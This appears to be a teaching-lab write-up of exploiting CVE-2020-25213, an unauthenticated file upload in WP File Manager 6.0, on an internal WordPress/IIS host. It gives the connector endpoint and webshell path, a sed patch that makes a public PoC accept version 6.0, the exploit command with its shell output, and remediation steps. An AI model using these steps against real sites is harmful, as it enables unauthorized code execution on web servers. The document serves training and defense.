# WP File Manager Arbitrary File Upload: UOW-CSF-WP

## Summary

WP File Manager 6.0, installed on the `UOW-CSF-WP` IIS site, exposes its elFinder connector endpoint, `connector.minimal.php`, without WordPress's normal capability checks. This allows an unauthenticated request to write an arbitrary PHP file into the plugin's own file store and have IIS execute it, the vulnerability publicly tracked as CVE-2020-25213. A public PoC targeting this flaw was adapted for this lab (its version check excluded 6.0 itself) and used to upload and execute a proof file against `uow-news.uow-csf.internal`, confirming code execution as the site's IIS application pool identity, `iis apppool\uow-csf-wp`.

## Environment

| Item | Value |
|---|---|
| Target | `uow-csf-dc.uow-csf.internal`, `192.168.144.200` |
| Domain | `uow-csf.internal` |
| WordPress hostname | `uow-news.uow-csf.internal` |
| WordPress version | 6.6.2 |
| Vulnerable plugin | WP File Manager, package `wp-file-manager.6.0.zip` (stable tag 6.0) |
| IIS site | `UOW-CSF-WP` |
| Application pool | `UOW-CSF-WP` |
| Attacker | Kali VM on the same host-only lab network |
| Tools | Python 3 (`.venv`), public PoC (`ircashem/wp-file-manager-plugin-exploit`) |

## Lab Dependencies

- Prerequisite: the WordPress/IIS service build (`w-01` section 15), which stood up WP File Manager 6.0 on `uow-news.uow-csf.internal`.
- Starting access: unauthenticated web access to `uow-news.uow-csf.internal`. No WordPress account or Windows credential is required.
- Resulting access: arbitrary PHP execution as the IIS application pool identity `iis apppool\uow-csf-wp`, a local IIS application-pool virtual identity with no AD/domain identity and no reusable domain credential.
- Feeds into: nothing further in the current build. This path is deliberately independent of the AD credential-abuse paths (Kerberoasting against `svc-web`, AS-REP roasting against `helpdesk01`, DCSync via `backup.operator`), which target the domain controller's AD services directly and require a valid or recoverable domain credential; this path targets the WordPress web application layer and requires none.
- Suggested teaching level: Level 5–6.

## Exploitation

### Vulnerable endpoint

WP File Manager's elFinder connector is reachable directly, bypassing WordPress's authentication and capability checks:

```text
/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
```

A crafted request against this endpoint writes a PHP file into the plugin's own file directory, which IIS then serves and executes as ordinary PHP content:

```text
/wp-content/plugins/wp-file-manager/lib/files/if_it_works.php
```

### Adapting the public PoC

The PoC used was `https://github.com/ircashem/wp-file-manager-plugin-exploit`. As published, its version check excludes the exact version installed in this lab:

```text
version < 6.9 and version > 6.0
```

Since the target runs 6.0 itself, this check rejects it. For this lab, the check was corrected locally to include the boundary:

```bash
sed -i 's/version < 6.9 and version > 6.0/version < 6.9 and version >= 6.0/' exploit.py
grep -n "version <" exploit.py
```

```text
98:    if upload_shell(url) and version < 6.9 and version >= 6.0:
```

This edit only corrects the version boundary so 6.0 is included; no other logic in the PoC was modified.

### Running the PoC

```bash
.venv/bin/python exploit.py --url http://uow-news.uow-csf.internal
```

```text
[+] Shell uploaded successfully
PwNed!!!
(ircashem)whoami

iis apppool\uow-csf-wp

(ircashem)exit
[-] Exiting...
Removing the uploaded shell
[+] Shell deleted from the server successfully.
```

The WordPress plugin path was successfully exercised: the upload succeeded, and the `whoami` output, not just the "Shell uploaded" message, is what confirms command execution actually occurred on the target.

### Confirming the execution identity

`iis apppool\uow-csf-wp` is exactly the virtual account backing the `UOW-CSF-WP` application pool, `ApplicationPoolIdentity`. This confirms the uploaded file executed as the site's own app pool, not as `svc-web`, not as a domain account, and not as `Administrator`. It carries no credential that can be reused elsewhere and has no relationship to the AD accounts targeted by the other Windows Phase 2 activities.

### Cleanup

Exiting the PoC's interactive session (`exit`) triggers its own teardown, removing the uploaded proof file: `Removing the uploaded shell` / `[+] Shell deleted from the server successfully.` in the output above. The proof file was removed by exiting the PoC cleanly, no separate deletion step was needed.

## Outcome

The WP File Manager 6.0 connector endpoint allows unauthenticated arbitrary PHP file upload and execution, confirmed by uploading and executing a proof file and observing its output. Execution lands as the local IIS application pool identity (`iis apppool\uow-csf-wp`) only, a per-pool local virtual account with no AD/domain identity and no reusable domain credential. This is web application compromise of the WordPress service itself, not a domain credential, not privilege escalation, and not lateral movement, no further access was attempted or demonstrated from this foothold.

## Teaching Notes

- Public PoC code cannot be trusted uncritically: this PoC's own version check would have skipped the exact version installed here, a one-line correction was required after reading the check rather than just running the tool.
- The `whoami` output is the key piece of evidence, not the "Shell uploaded" message: it is what distinguishes this as local app pool code execution rather than any Windows or AD credential compromise.
- This activity is deliberately kept separate from the AD credential-abuse paths (`e-18`, `e-19`, `e-21`): those require an existing or recoverable domain credential and target AD services on the DC directly, this targets the WordPress application over HTTP and requires none. No chaining between the two is demonstrated in this build.
- `wp-file-manager`'s installation as a website plugin (`w-01` section 15) rather than as an AD-integrated service is itself part of the design: the WordPress site's application pool identity has no domain identity to abuse, so this path terminates locally.

## Remediation

- Update WP File Manager to 6.9 or later, or remove it if not required.
- Limit plugin installation and updates to trusted administrators.
- Monitor web roots for unexpected PHP files, particularly under plugin upload/file-store directories.
- Keep WordPress core, PHP, and all plugins patched on a regular schedule.
- Keep the WordPress application pool identity isolated from domain identities; it should never run as a domain account.
- Restrict filesystem write permissions on the web root to the minimum the application pool identity actually needs.
